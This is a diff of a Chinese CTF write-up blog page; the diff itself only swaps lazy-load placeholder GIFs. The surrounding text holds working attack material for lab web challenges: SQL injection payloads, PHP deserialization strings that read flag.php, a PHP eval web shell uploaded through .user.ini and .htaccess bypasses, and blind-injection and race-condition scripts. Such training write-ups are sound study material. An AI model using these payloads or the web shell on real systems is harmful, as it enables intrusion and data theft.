+<p><img src="https://assets.btwoa.com/gif/dimo.gif" data-lazy-src="https://assets.btwoa.com/202205141027292.avif" alt="" loading="lazy"></p>
 <p>修改 Content-Type</p>
-<p><img src="https://assets.btwoa.com/gif/rabbit.gif" data-lazy-src="https://assets.btwoa.com/202205141027872.avif" alt="" loading="lazy"></p>
-<p><img src="https://assets.btwoa.com/gif/rabbit.gif" data-lazy-src="https://assets.btwoa.com/202205141029714.avif" alt="" loading="lazy"></p>
+<p><img src="https://assets.btwoa.com/gif/dimo.gif" data-lazy-src="https://assets.btwoa.com/202205141027872.avif" alt="" loading="lazy"></p>
+<p><img src="https://assets.btwoa.com/gif/dimo.gif" data-lazy-src="https://assets.btwoa.com/202205141029714.avif" alt="" loading="lazy"></p>
 <p>上传 ba2in9a-asp.avif</p>
-<p><img src="https://assets.btwoa.com/gif/rabbit.gif" data-lazy-src="https://assets.btwoa.com/202205141031351.avif" alt="" loading="lazy"></p>
-<p><img src="https://assets.btwoa.com/gif/rabbit.gif" data-lazy-src="https://assets.btwoa.com/202205141032914.avif" alt="" loading="lazy"></p>
-<p><img src="https://assets.btwoa.com/gif/rabbit.gif" data-lazy-src="https://assets.btwoa.com/202205141051670.avif" alt="" loading="lazy"></p>
+<p><img src="https://assets.btwoa.com/gif/dimo.gif" data-lazy-src="https://assets.btwoa.com/202205141031351.avif" alt="" loading="lazy"></p>
+<p><img src="https://assets.btwoa.com/gif/dimo.gif" data-lazy-src="https://assets.btwoa.com/202205141032914.avif" alt="" loading="lazy"></p>
+<p><img src="https://assets.btwoa.com/gif/dimo.gif" data-lazy-src="https://assets.btwoa.com/202205141051670.avif" alt="" loading="lazy"></p>
 <pre class="language-php" data-language="php"><code class="language-php">ba2in9a<span class="token operator">=</span><span class="token function">show_source</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/flag'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
-<p><img src="https://assets.btwoa.com/gif/rabbit.gif" data-lazy-src="https://assets.btwoa.com/202205141056790.avif" alt="" loading="lazy"></p>
+<p><img src="https://assets.btwoa.com/gif/dimo.gif" data-lazy-src="https://assets.btwoa.com/202205141056790.avif" alt="" loading="lazy"></p>
 <h2 id="网鼎杯-2018-Fakebook"><a class="headerlink" href="#网鼎杯-2018-Fakebook"></a>[网鼎杯 2018]Fakebook</h2>
 <p>dirsearch 扫出了 <code>robots.txt</code> <code>flag.php</code> <code>error.php</code> <code>view.php</code> <code>db.php</code></p>
 <p>robots.txt 提示存在 user.php.bak</p>
@@ -948,7 +948,7 @@ handsome=flag&amp;flag=x&amp;x=flag</code></pre>
 <pre class="language-none"><code class="language-none">no=-1%20union%20select%201,2,3,4%20%23</code></pre>
 <p>no hack ~_~</p>
 <pre class="language-none"><code class="language-none">no=-1%20union/**/select%201,2,3,4%20%23</code></pre>
-<p><img src="https://assets.btwoa.com/gif/rabbit.gif" data-lazy-src="https://assets.btwoa.com/202205132138218.avif" alt="" loading="lazy"></p>
+<p><img src="https://assets.btwoa.com/gif/dimo.gif" data-lazy-src="https://assets.btwoa.com/202205132138218.avif" alt="" loading="lazy"></p>
 <pre class="language-none"><code class="language-none">no=-1%20union/**/select%201,@@version_compile_os,3,4%20%23</code></pre>
 <p>Linux</p>
 <pre class="language-none"><code class="language-none">no=-1%20union/**/select%201,version(),3,4%20%23</code></pre>
@@ -975,7 +975,7 @@ handsome=flag&amp;flag=x&amp;x=flag</code></pre>
 <span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">UserInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre>
 <pre class="language-none"><code class="language-none">O:8:"UserInfo":3:{s:4:"name";s:1:"0";s:3:"age";i:0;s:4:"blog";s:29:"file:///var/www/html/flag.php";}</code></pre>
 <pre class="language-none"><code class="language-none">no=-1%20union/**/select%201,2,3,%27O:8:"UserInfo":3:{s:4:"name";s:1:"0";s:3:"age";i:0;s:4:"blog";s:29:"file:///var/www/html/flag.php";}%27</code></pre>
-<p><img src="https://assets.btwoa.com/gif/rabbit.gif" data-lazy-src="https://assets.btwoa.com/202205132342788.avif" alt="" loading="lazy"></p>
+<p><img src="https://assets.btwoa.com/gif/dimo.gif" data-lazy-src="https://assets.btwoa.com/202205132342788.avif" alt="" loading="lazy"></p>
 <pre class="language-none"><code class="language-none">PD9waHANCg0KJGZsYWcgPSAiZmxhZ3syOTkxM2UxYy0wZDllLTQ2OWEtYTEyNS0xZWZhOGUzMWYxMzF9IjsNCmV4aXQoMCk7DQo=</code></pre>
 <p>base64 解码后也会得到相同的内容</p>
 <pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
@@ -984,28 +984,28 @@ handsome=flag&amp;flag=x&amp;x=flag</code></pre>
 <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre>
 <p>也可以 load_file 直接读取</p>
 <pre class="language-none"><code class="language-none">no=-1 union/**/select 1,group_concat(load_file('/var/www/html/flag.php')),3,4 from users #setDefaults </code></pre>
-<p><img src="https://assets.btwoa.com/gif/rabbit.gif" data-lazy-src="https://assets.btwoa.com/202205132357921.avif" alt="" loading="lazy"></p>
+<p><img src="https://assets.btwoa.com/gif/dimo.gif" data-lazy-src="https://assets.btwoa.com/202205132357921.avif" alt="" loading="lazy"></p>
 <h2 id="CISCN2019-华北赛区-Day2-Web1-Hack-World"><a class="headerlink" href="#CISCN2019-华北赛区-Day2-Web1-Hack-World"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World</h2>
 <ol>
 <li>简单测试</li>
 </ol>
 <p>拿字典跑了下</p>
-<p><img src="https://assets.btwoa.com/gif/rabbit.gif" data-lazy-src="https://assets.btwoa.com/202205131010674.avif" alt="" loading="lazy"></p>
+<p><img src="https://assets.btwoa.com/gif/dimo.gif" data-lazy-src="https://assets.btwoa.com/202205131010674.avif" alt="" loading="lazy"></p>
 <p>当 id 的值为1或2时会查询到以下结果</p>
-<p><img src="https://assets.btwoa.com/gif/rabbit.gif" data-lazy-src="https://assets.btwoa.com/202205130954432.avif" alt="" loading="lazy"></p>
+<p><img src="https://assets.btwoa.com/gif/dimo.gif" data-lazy-src="https://assets.btwoa.com/202205130954432.avif" alt="" loading="lazy"></p>
 <p>id=1 =&gt; Hello, glzjin wants a girlfriend.</p>
 <p>id=2 =&gt; Do you want to be my girlfriend?</p>
 <p>当 id 的值为其他数字或 <code>@</code> 时回显 Error Occured When Fetch Result.</p>
-<p><img src="https://assets.btwoa.com/gif/rabbit.gif" data-lazy-src="https://assets.btwoa.com/202205131021251.avif" alt="" loading="lazy"></p>
+<p><img src="https://assets.btwoa.com/gif/dimo.gif" data-lazy-src="https://assets.btwoa.com/202205131021251.avif" alt="" loading="lazy"></p>
 <p>当 id 的值为 <code> </code> <code>or</code> <code>and</code> <code>from</code> <code>like</code> <code>insert</code> <code>delect</code> <code>update</code> <code>select</code> <code>sleep</code> 时回显 bool(false)</p>
-<p><img src="https://assets.btwoa.com/gif/rabbit.gif" data-lazy-src="https://assets.btwoa.com/202205131009071.avif" alt="" loading="lazy"></p>
+<p><img src="https://assets.btwoa.com/gif/dimo.gif" data-lazy-src="https://assets.btwoa.com/202205131009071.avif" alt="" loading="lazy"></p>
 <p>当 id 的值为 <code>--+</code> <code>information</code> <code>information_schema</code> <code>separator</code> <code>floor</code> <code>xor</code> 时回显 SQL Injection Checked.</p>
-<p><img src="https://assets.btwoa.com/gif/rabbit.gif" data-lazy-src="https://assets.btwoa.com/202205131018666.avif" alt="" loading="lazy"></p>
+<p><img src="https://assets.btwoa.com/gif/dimo.gif" data-lazy-src="https://assets.btwoa.com/202205131018666.avif" alt="" loading="lazy"></p>
 <p>尝试</p>
 <pre class="language-none"><code class="language-none">id=if(length((select(flag)from(flag)))=42,1,0)</code></pre>
 <p>回显 Hello, glzjin wants a girlfriend.</p>
 <p>确认 flag 有42个字符</p>
-<p><img src="https://assets.btwoa.com/gif/rabbit.gif" data-lazy-src="https://assets.btwoa.com/202205131043655.avif" alt="" loading="lazy"></p>
+<p><img src="https://assets.btwoa.com/gif/dimo.gif" data-lazy-src="https://assets.btwoa.com/202205131043655.avif" alt="" loading="lazy"></p>
 <ol start="2">
 <li>二分法穷举</li>
 </ol>
@@ -1043,7 +1043,7 @@ flag<span class="token operator">=</span><span class="token string">""</span>
     flag<span class="token operator">+=</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
     <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
 <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span></code></pre>
-<p><img src="https://assets.btwoa.com/gif/rabbit.gif" data-lazy-src="https://assets.btwoa.com/202205131050705.avif" alt="" loading="lazy"></p>
+<p><img src="https://assets.btwoa.com/gif/dimo.gif" data-lazy-src="https://assets.btwoa.com/202205131050705.avif" alt="" loading="lazy"></p>
 <h2 id="GYCTF2020-Blacklist"><a class="headerlink" href="#GYCTF2020-Blacklist"></a>[GYCTF2020]Blacklist</h2>
 <ol>
 <li>联合注入</li>
@@ -1134,10 +1134,10 @@ string(0) ""
 <li>fuzz</li>
 </ol>
 <p>过滤了 <code>(</code> <code>)</code> <code>=</code> <code>or</code> <code>xor</code> <code>order</code> 等关键字</p>
-<p><img src="https://assets.btwoa.com/gif/rabbit.gif" data-lazy-src="https://assets.btwoa.com/202203101532406.avif" alt="" loading="lazy"></p>
+<p><img src="https://assets.btwoa.com/gif/dimo.gif" data-lazy-src="https://assets.btwoa.com/202203101532406.avif" alt="" loading="lazy"></p>
 <p>第二列数据为用户名，第三列数据为 MD5 加密的密码</p>
 <pre class="language-none"><code class="language-none">name=' union select 1,'admin','21232f297a57a5a743894a0e4a801fc3' #&amp;pw=admin</code></pre>
-<p><img src="https://assets.btwoa.com/gif/rabbit.gif" data-lazy-src="https://assets.btwoa.com/202203101647164.avif" alt="" loading="lazy"></p>
+<p><img src="https://assets.btwoa.com/gif/dimo.gif" data-lazy-src="https://assets.btwoa.com/202203101647164.avif" alt="" loading="lazy"></p>
 <h2 id="网鼎杯-2020-青龙组-AreUSerialz"><a class="headerlink" href="#网鼎杯-2020-青龙组-AreUSerialz"></a>[网鼎杯 2020 青龙组]AreUSerialz</h2>
 <pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
 
@@ -1236,7 +1236,7 @@ string(0) ""
  
 <span class="token delimiter important">?&gt;</span></span></code></pre>
 <pre class="language-none"><code class="language-none">?str=O:11:"FileHandler":3:{s:2:"op";s:4:" 2";s:8:"filename";s:8:"flag.php";s:7:"content";s:0:"";}</code></pre>
-<p><img src="https://assets.btwoa.com/gif/rabbit.gif" data-lazy-src="https://assets.btwoa.com/202203091831609.avif" alt="" loading="lazy"></p>
+<p><img src="https://assets.btwoa.com/gif/dimo.gif" data-lazy-src="https://assets.btwoa.com/202203091831609.avif" alt="" loading="lazy"></p>
 <h2 id="MRCTF2020-Ez-bypass"><a class="headerlink" href="#MRCTF2020-Ez-bypass"></a>[MRCTF2020]Ez_bypass</h2>
 <pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">include</span> <span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">;</span>
 <span class="token variable">$flag</span><span class="token operator">=</span><span class="token string single-quoted-string">'MRCTF{xxxxxxxxxxxxxxxxxxxxxxxxx}'</span><span class="token punctuation">;</span>
@@ -1286,29 +1286,29 @@ string(0) ""
 </ol>
 <p>passwd=1234567a</p>
 <p>passwd=1234567%00</p>
-<p><img src="https://assets.btwoa.com/gif/rabbit.gif" data-lazy-src="https://assets.btwoa.com/202203091504578.avif" alt="" loading="lazy"></p>
+<p><img src="https://assets.btwoa.com/gif/dimo.gif" data-lazy-src="https://assets.btwoa.com/202203091504578.avif" alt="" loading="lazy"></p>
 <h2 id="MRCTF2020-你传你🐎呢"><a class="headerlink" href="#MRCTF2020-你传你🐎呢"></a>[MRCTF2020]你传你🐎呢</h2>
 <ol>
 <li>.htaccess</li>
 </ol>
-<p><img src="https://assets.btwoa.com/gif/rabbit.gif" data-lazy-src="https://assets.btwoa.com/202203051222747.avif" alt="" loading="lazy"></p>
+<p><img src="https://assets.btwoa.com/gif/dimo.gif" data-lazy-src="https://assets.btwoa.com/202203051222747.avif" alt="" loading="lazy"></p>
 <p>修改 Content-Type</p>
-<p><img src="https://assets.btwoa.com/gif/rabbit.gif" data-lazy-src="https://assets.btwoa.com/202203051222519.avif" alt="" loading="lazy"></p>
+<p><img src="https://assets.btwoa.com/gif/dimo.gif" data-lazy-src="https://assets.btwoa.com/202203051222519.avif" alt="" loading="lazy"></p>
 <pre class="language-none"><code class="language-none">/var/www/html/upload/315f3ebf1b34561a6edd5834019ba782/.htaccess succesfully uploaded!</code></pre>
 <ol start="2">
 <li>一句话</li>
 </ol>
-<p><img src="https://assets.btwoa.com/gif/rabbit.gif" data-lazy-src="https://assets.btwoa.com/202203051222115.avif" alt="" loading="lazy"></p>
+<p><img src="https://assets.btwoa.com/gif/dimo.gif" data-lazy-src="https://assets.btwoa.com/202203051222115.avif" alt="" loading="lazy"></p>
 <p>修改 Content-Type</p>
-<p><img src="https://assets.btwoa.com/gif/rabbit.gif" data-lazy-src="https://assets.btwoa.com/202203051222097.avif" alt="" loading="lazy"></p>
+<p><img src="https://assets.btwoa.com/gif/dimo.gif" data-lazy-src="https://assets.btwoa.com/202203051222097.avif" alt="" loading="lazy"></p>
 <pre class="language-none"><code class="language-none">/var/www/html/upload/315f3ebf1b34561a6edd5834019ba782/ba2in9a-php.avif succesfully uploaded!</code></pre>
 <pre class="language-php" data-language="php"><code class="language-php">ba2in9a<span class="token operator">=</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">scandir</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 
 ba2in9a<span class="token operator">=</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
-<p><img src="https://assets.btwoa.com/gif/rabbit.gif" data-lazy-src="https://assets.btwoa.com/202203051227380.avif" alt="" loading="lazy"></p>
+<p><img src="https://assets.btwoa.com/gif/dimo.gif" data-lazy-src="https://assets.btwoa.com/202203051227380.avif" alt="" loading="lazy"></p>
 <h2 id="极客大挑战-2019-HardSQL"><a class="headerlink" href="#极客大挑战-2019-HardSQL"></a>[极客大挑战 2019]HardSQL</h2>
 <p>fuzz 过滤了 <code> </code> <code>!</code> <code>&amp;</code> <code>*</code> <code>+</code> <code>&lt;</code> <code>&gt;</code> <code>=</code> <code>|</code> <code>\\</code> <code>if</code> <code>and</code> <code>union</code> <code>drop</code> <code>having</code> <code>mid</code> <code>sleep</code> <code>hex</code> <code>char</code> <code>ascii</code> <code>substr</code> <code>greatest</code> 等关键字</p>
-<p><img src="https://assets.btwoa.com/gif/rabbit.gif" data-lazy-src="https://assets.btwoa.com/202203051105179.avif" alt="" loading="lazy"></p>
+<p><img src="https://assets.btwoa.com/gif/dimo.gif" data-lazy-src="https://assets.btwoa.com/202203051105179.avif" alt="" loading="lazy"></p>
 <p>报错注入</p>
 <p>查看数据库基础信息</p>
 <pre class="language-none"><code class="language-none">'or(updatexml(1,concat(0x7e,version(),0x7e),1))#</code></pre>
@@ -1371,14 +1371,14 @@ ba2in9a<span class="token operator">=</span><span class="token function">var_dum
 <li>exif_imagetype</li>
 </ol>
 <p>GIF89a 文件头绕过 exif_imagetype 函数</p>
-<p><img src="https://assets.btwoa.com/gif/rabbit.gif" data-lazy-src="https://assets.btwoa.com/202203040921492.avif" alt="" loading="lazy"></p>
+<p><img src="https://assets.btwoa.com/gif/dimo.gif" data-lazy-src="https://assets.btwoa.com/202203040921492.avif" alt="" loading="lazy"></p>
 <p>.user.ini</p>
 <pre class="language-none"><code class="language-none">GIF89a?
 auto_append_file=ba2in9a-asp.avif</code></pre>
 <p>ba2in9a-asp.avif</p>
 <pre class="language-none"><code class="language-none">GIF89a?
 &lt;script language="php"&gt;eval($_POST['ba2in9a']);&lt;/script&gt;</code></pre>
-<p><img src="https://assets.btwoa.com/gif/rabbit.gif" data-lazy-src="https://assets.btwoa.com/202203040938559.avif" alt="" loading="lazy"></p>
+<p><img src="https://assets.btwoa.com/gif/dimo.gif" data-lazy-src="https://assets.btwoa.com/202203040938559.avif" alt="" loading="lazy"></p>
 <p>扫描根目录</p>
 <pre class="language-none"><code class="language-none">ba2in9a=var_dump(scandir("/"));</code></pre>
 <p>输出文件内容</p>
@@ -1408,14 +1408,14 @@ auto_append_file=ba2in9a-asp.avif</code></pre>
 </ol>
 <p>使用 data:// 封装协议将所需内容写入 text</p>
 <pre class="language-none"><code class="language-none">?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=</code></pre>
-<p><img src="https://assets.btwoa.com/gif/rabbit.gif" data-lazy-src="https://assets.btwoa.com/202202162330553.avif" alt="" loading="lazy"></p>
+<p><img src="https://assets.btwoa.com/gif/dimo.gif" data-lazy-src="https://assets.btwoa.com/202202162330553.avif" alt="" loading="lazy"></p>
 <ol start="2">
 <li>php://filter</li>
 </ol>
 <p>使用 php://filter 封装协议读取 useless.php</p>
 <pre class="language-none"><code class="language-none">?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY&amp;file=php://filter/read=convert.base64-encode/resource=useless.php</code></pre>
 <pre class="language-none"><code class="language-none">PD9waHAgIAoKY2xhc3MgRmxhZ3sgIC8vZmxhZy5waHAgIAogICAgcHVibGljICRmaWxlOyAgCiAgICBwdWJsaWMgZnVuY3Rpb24gX190b3N0cmluZygpeyAgCiAgICAgICAgaWYoaXNzZXQoJHRoaXMtPmZpbGUpKXsgIAogICAgICAgICAgICBlY2hvIGZpbGVfZ2V0X2NvbnRlbnRzKCR0aGlzLT5maWxlKTsgCiAgICAgICAgICAgIGVjaG8gIjxicj4iOwogICAgICAgIHJldHVybiAoIlUgUiBTTyBDTE9TRSAhLy8vQ09NRSBPTiBQTFoiKTsKICAgICAgICB9ICAKICAgIH0gIAp9ICAKPz4gIAo=</code></pre>
-<p><img src="https://assets.btwoa.com/gif/rabbit.gif" data-lazy-src="https://assets.btwoa.com/202202162332721.avif" alt="" loading="lazy"></p>
+<p><img src="https://assets.btwoa.com/gif/dimo.gif" data-lazy-src="https://assets.btwoa.com/202202162332721.avif" alt="" loading="lazy"></p>
 <pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>  
 
 <span class="token keyword">class</span> <span class="token class-name-definition class-name">Flag</span><span class="token punctuation">{</span>  <span class="token comment">//flag.php  </span>
@@ -1447,13 +1447,13 @@ print_r(serialize(new Flag()));
 <li>payload</li>
 </ol>
 <pre class="language-none"><code class="language-none">?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=useless.php&amp;password=O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}</code></pre>
-<p><img src="https://assets.btwoa.com/gif/rabbit.gif" data-lazy-src="https://assets.btwoa.com/202202162334323.avif" alt="" loading="lazy"></p>
+<p><img src="https://assets.btwoa.com/gif/dimo.gif" data-lazy-src="https://assets.btwoa.com/202202162334323.avif" alt="" loading="lazy"></p>
 <h2 id="BJDCTF2020-Easy-MD5"><a class="headerlink" href="#BJDCTF2020-Easy-MD5"></a>[BJDCTF2020]Easy MD5</h2>
 <ol>
 <li>hint</li>
 </ol>
 <p>响应头（Response header）存在提示</p>
-<p><img src="https://assets.btwoa.com/gif/rabbit.gif" data-lazy-src="https://assets.btwoa.com/202202161240283.avif" alt="" loading="lazy"></p>
+<p><img src="https://assets.btwoa.com/gif/dimo.gif" data-lazy-src="https://assets.btwoa.com/202202161240283.avif" alt="" loading="lazy"></p>
 <pre class="language-none"><code class="language-none">select * from 'admin' where password=md5($pass,true)</code></pre>
 <ol start="2">
 <li>绕过</li>
@@ -1501,7 +1501,7 @@ print_r(serialize(new Flag()));
 <span class="token delimiter important">?&gt;</span></span></code></pre>
 <p>数组绕过</p>
 <p>md5 不能处理数组，会直接返回 null, 此时两个数组进行比较时恒等</p>
-<p><img src="https://assets.btwoa.com/gif/rabbit.gif" data-lazy-src="https://assets.btwoa.com/202202161336692.avif" alt="" loading="lazy"></p>
+<p><img src="https://assets.btwoa.com/gif/dimo.gif" data-lazy-src="https://assets.btwoa.com/202202161336692.avif" alt="" loading="lazy"></p>
 <p>0e绕过</p>
 <p>字符串 md5 加密后以 0e 开头，被当作使用科学计数法的数字进行比较，所以恒等</p>
 <details><summary>0e开头字符串</summary><div class="content"><p>240610708:0e462097431906509019562988736854<br>
@@ -2542,7 +2542,7 @@ KnCM6ogsNA1W:00e73414578113850089230341919829<br>
         <i class="solitude st-arrow-right-bold"></i>
     </div>
     </a>
-<p><img src="https://assets.btwoa.com/gif/rabbit.gif" data-lazy-src="https://assets.btwoa.com/202202161405858.avif" alt="" loading="lazy"></p>
+<p><img src="https://assets.btwoa.com/gif/dimo.gif" data-lazy-src="https://assets.btwoa.com/202202161405858.avif" alt="" loading="lazy"></p>
 <ol start="3">
 <li>强类型绕过</li>
 </ol>
@@ -2558,7 +2558,7 @@ if($_POST['param1']!==$_POST['param2']&amp;&amp;md5($_POST['param1'])===md5($_PO
     echo $flag;
 }</code></pre>
 <p>数组绕过</p>
-<p><img src="https://assets.btwoa.com/gif/rabbit.gif" data-lazy-src="https://assets.btwoa.com/202202161427232.avif" alt="" loading="lazy"></p>
+<p><img src="https://assets.btwoa.com/gif/dimo.gif" data-lazy-src="https://assets.btwoa.com/202202161427232.avif" alt="" loading="lazy"></p>
 <p>MD5碰撞</p>
 <a class="tag-link" target="_blank" href="/π.html?omnitrix=aHR0cHM6Ly9jcnlwdG8uc3RhY2tleGNoYW5nZS5jb20vcXVlc3Rpb25zLzE0MzQvYXJlLXRoZXJlLXR3by1rbm93bi1zdHJpbmdzLXdoaWNoLWhhdmUtdGhlLXNhbWUtbWQ1LWhhc2gtdmFsdWUv" rel="external nofollow noopener noreferrer">
     <div class="tag-link-tips">引用站外链接</div>
@@ -2614,9 +2614,9 @@ if($_POST['param1']!==$_POST['param2']&amp;&amp;md5($_POST['param1'])===md5($_PO
     </a>
 <p>strlower会将大写字母转化为小写</p>
 <p>上下标字母会被转化为对应同形字</p>
-<p><img src="https://assets.btwoa.com/gif/rabbit.gif" data-lazy-src="https://assets.btwoa.com/202202122339122.avif" alt="" loading="lazy"></p>
+<p><img src="https://assets.btwoa.com/gif/dimo.gif" data-lazy-src="https://assets.btwoa.com/202202122339122.avif" alt="" loading="lazy"></p>
 <p>routes.py登录页/login和改密页/change都会执行strlower</p>
-<p><img src="https://assets.btwoa.com/gif/rabbit.gif" data-lazy-src="https://assets.btwoa.com/202202122344024.avif" alt="" loading="lazy"></p>
+<p><img src="https://assets.btwoa.com/gif/dimo.gif" data-lazy-src="https://assets.btwoa.com/202202122344024.avif" alt="" loading="lazy"></p>
 <p>unicode字符标准化时会转变为对应的同形字</p>
 <p>利用同形字 <code>ᴬdmin</code> 注册时会执行一次strlower，在/change页更改密码会再次执行strlower</p>
 <p><code>ᴬ</code> -&gt; <code>A</code> -&gt; <code>a</code></p>
@@ -2698,7 +2698,7 @@ if($_POST['param1']!==$_POST['param2']&amp;&amp;md5($_POST['param1'])===md5($_PO
 
 <span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
     <span class="token keyword">print</span><span class="token punctuation">(</span>decryption<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>
-<p><img src="https://assets.btwoa.com/gif/rabbit.gif" data-lazy-src="https://assets.btwoa.com/202202132221484.avif" alt="" loading="lazy"></p>
+<p><img src="https://assets.btwoa.com/gif/dimo.gif" data-lazy-src="https://assets.btwoa.com/202202132221484.avif" alt="" loading="lazy"></p>
 <a class="tag-link" target="_blank" href="/π.html?omnitrix=aHR0cHM6Ly9naXRodWIuY29tL25vcmFqL2ZsYXNrLXNlc3Npb24tY29va2llLW1hbmFnZXIv" rel="external nofollow noopener noreferrer">
     <div class="tag-link-tips">引用站外链接</div>
     <div class="tag-link-bottom">
@@ -2713,12 +2713,12 @@ if($_POST['param1']!==$_POST['param2']&amp;&amp;md5($_POST['param1'])===md5($_PO
     </div>
     </a>
 <p><a target="_blank" rel="external nofollow noopener noreferrer" href="/π.html?omnitrix=aHR0cDovL2NvbmZpZy5weQ==">config.py</a> 中查得 SECRET_KEY=ckj123</p>
-<p><img src="https://assets.btwoa.com/gif/rabbit.gif" data-lazy-src="https://assets.btwoa.com/202202132229234.avif" alt="" loading="lazy"></p>
-<p><img src="https://assets.btwoa.com/gif/rabbit.gif" data-lazy-src="https://assets.btwoa.com/202202132358930.avif" alt="" loading="lazy"></p>
+<p><img src="https://assets.btwoa.com/gif/dimo.gif" data-lazy-src="https://assets.btwoa.com/202202132229234.avif" alt="" loading="lazy"></p>
+<p><img src="https://assets.btwoa.com/gif/dimo.gif" data-lazy-src="https://assets.btwoa.com/202202132358930.avif" alt="" loading="lazy"></p>
 <p>试了好几次还是没出，好烦</p>
-<p><img src="https://assets.btwoa.com/gif/rabbit.gif" data-lazy-src="https://assets.btwoa.com/202202140000743.avif" alt="" loading="lazy"></p>
+<p><img src="https://assets.btwoa.com/gif/dimo.gif" data-lazy-src="https://assets.btwoa.com/202202140000743.avif" alt="" loading="lazy"></p>
 <p>正常情况</p>
-<p><img src="https://assets.btwoa.com/gif/rabbit.gif" data-lazy-src="https://assets.btwoa.com/202202140001087.avif" alt="" loading="lazy"></p>
+<p><img src="https://assets.btwoa.com/gif/dimo.gif" data-lazy-src="https://assets.btwoa.com/202202140001087.avif" alt="" loading="lazy"></p>
 <p>条件竞争</p>
 <pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests 
 <span class="token keyword">import</span> threading
@@ -2801,7 +2801,7 @@ Pay for the flag!!!hacker!!!</p>
 <p>即当money的值小于100000000时</p>
 <p>you have not enough money,loser~</p>
 <p>money=1e9 / money[]=1</p>
-<p><img src="https://assets.btwoa.com/gif/rabbit.gif" data-lazy-src="https://assets.btwoa.com/202202062011720.avif" alt="" loading="lazy"></p>
+<p><img src="https://assets.btwoa.com/gif/dimo.gif" data-lazy-src="https://assets.btwoa.com/202202062011720.avif" alt="" loading="lazy"></p>
 <h2 id="护网杯-2018-easy-tornado"><a class="headerlink" href="#护网杯-2018-easy-tornado"></a>[护网杯 2018]easy_tornado</h2>
 <ol>
 <li>hint</li>
@@ -2828,10 +2828,10 @@ md5(cookie_secret+md5(filename))</p>
 <p>指出如何生成 filehash 的值</p>
 <p>重点在获取 <strong>cookie_secret</strong> 的值</p>
 <p>cookie_secret 是 handler.application.settings 的键值。</p>
-<p><img src="https://assets.btwoa.com/gif/rabbit.gif" data-lazy-src="https://assets.btwoa.com/202202061624219.avif" alt="" loading="lazy"></p>
-<p><img src="https://assets.btwoa.com/gif/rabbit.gif" data-lazy-src="https://assets.btwoa.com/202202061624580.avif" alt="" loading="lazy"></p>
-<p><img src="https://assets.btwoa.com/gif/rabbit.gif" data-lazy-src="https://assets.btwoa.com/202202061638925.avif" alt="" loading="lazy"></p>
-<p><img src="https://assets.btwoa.com/gif/rabbit.gif" data-lazy-src="https://assets.btwoa.com/202202061640259.avif" alt="" loading="lazy"></p>
+<p><img src="https://assets.btwoa.com/gif/dimo.gif" data-lazy-src="https://assets.btwoa.com/202202061624219.avif" alt="" loading="lazy"></p>
+<p><img src="https://assets.btwoa.com/gif/dimo.gif" data-lazy-src="https://assets.btwoa.com/202202061624580.avif" alt="" loading="lazy"></p>
+<p><img src="https://assets.btwoa.com/gif/dimo.gif" data-lazy-src="https://assets.btwoa.com/202202061638925.avif" alt="" loading="lazy"></p>
+<p><img src="https://assets.btwoa.com/gif/dimo.gif" data-lazy-src="https://assets.btwoa.com/202202061640259.avif" alt="" loading="lazy"></p>
 <ul>
 <li>
 <p>handler -&gt; RequestHandler</p>
@@ -2848,7 +2848,7 @@ md5(cookie_secret+md5(filename))</p>
 
 {'autoreload': True, 'compiled_template_cache': False, 'cookie_secret': 'cba73db5-9b2f-4f78-a0c1-577900cda7d6'}</code></pre>
 <p>md5 生成 filehash</p>
-<p><img src="https://assets.btwoa.com/gif/rabbit.gif" data-lazy-src="https://assets.btwoa.com/202202061723353.avif" alt="" loading="lazy"></p>
+<p><img src="https://assets.btwoa.com/gif/dimo.gif" data-lazy-src="https://assets.btwoa.com/202202061723353.avif" alt="" loading="lazy"></p>
